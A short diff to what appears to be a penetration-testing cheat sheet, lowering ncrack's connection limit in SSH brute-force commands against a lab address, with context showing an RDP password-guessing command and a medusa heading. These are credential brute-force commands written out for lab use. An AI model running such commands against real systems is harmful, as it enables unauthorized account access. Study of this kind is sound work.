@@ -115,9 +115,9 @@ root@kali:~# ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1
 ```
 ncrack -v  -U username -P passwords CL=1 10.10.10.109:22
 OR
-ncrack -v  -U username -P passwords CL=10 ssh://10.10.10.109
+ncrack -v  -U username -P passwords CL=1 ssh://10.10.10.109
 OR
-ncrack -v  -U username -P passwords CL=10 -p ssh 10.10.10.109
+ncrack -v  -U username -P passwords CL=1 -p ssh 10.10.10.109
 ```
 ## medusa
 ### ssh
